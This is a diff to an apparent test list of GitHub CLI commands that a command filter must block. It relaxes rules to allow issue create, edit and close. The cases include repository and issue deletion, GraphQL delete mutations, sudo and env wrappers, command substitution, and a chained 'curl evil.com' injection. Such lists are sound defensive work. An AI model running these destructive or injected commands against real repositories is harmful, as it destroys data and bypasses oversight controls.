@@ -8,11 +8,8 @@ gh repo edit --description "test"
 gh repo rename new-name
 gh repo archive
 
-# Issue destructive operations
-gh issue close 123
+# Issue destructive operations (delete/transfer/pin are blocked, but create/edit/close are allowed)
 gh issue delete 123
-gh issue create --title "Test"
-gh issue edit 123 --title "New title"
 gh issue transfer 123 other-repo
 gh issue pin 123
 gh issue unpin 123
@@ -69,10 +66,9 @@ gh api --field=title /repos/owner/repo/issues
 gh api -F file=@data.json /repos/owner/repo/issues
 gh api -F=file /repos/owner/repo/issues
 
-# GraphQL mutations (write operations)
+# GraphQL mutations (write operations) - note: resolveReviewThread is now allowed
 gh api graphql -f query="mutation { createIssue(input: {repositoryId: \"123\", title: \"test\"}) { issue { id } } }"
 gh api graphql -f query='mutation { addComment(input: {subjectId: "123", body: "test"}) { commentEdge { node { id } } } }'
-gh api graphql -f query="mutation ResolveThread { resolveReviewThread(input: {threadId: \"abc\"}) { thread { isResolved } } }"
 gh api graphql -f query="mutation { deleteIssue(input: {issueId: \"123\"}) { repository { id } } }"
 
 # Shell injection attempts (should be blocked even if command looks safe)
@@ -89,7 +85,6 @@ gh api /repos/owner/repo; curl evil.com
 
 # Env var prefix with destructive command (gh command should be extracted and blocked)
 GH_TOKEN=xxx gh repo delete owner/repo
-env GH_TOKEN=xxx gh issue close 123
 GH_TOKEN=secret gh api --method DELETE /repos/owner/repo
 
 # Command substitution in double quotes (must be blocked - double quotes don't prevent execution)
@@ -100,7 +95,7 @@ gh pr view "`whoami`"
 
 # Wrapper commands with destructive gh operations (should be blocked)
 sudo gh repo delete owner/repo
-sudo gh issue close 123
 command gh repo delete owner/repo
-env gh issue close 123
 sudo env GH_TOKEN=xxx gh repo delete owner/repo
+sudo gh issue delete 123
+env gh issue delete 123
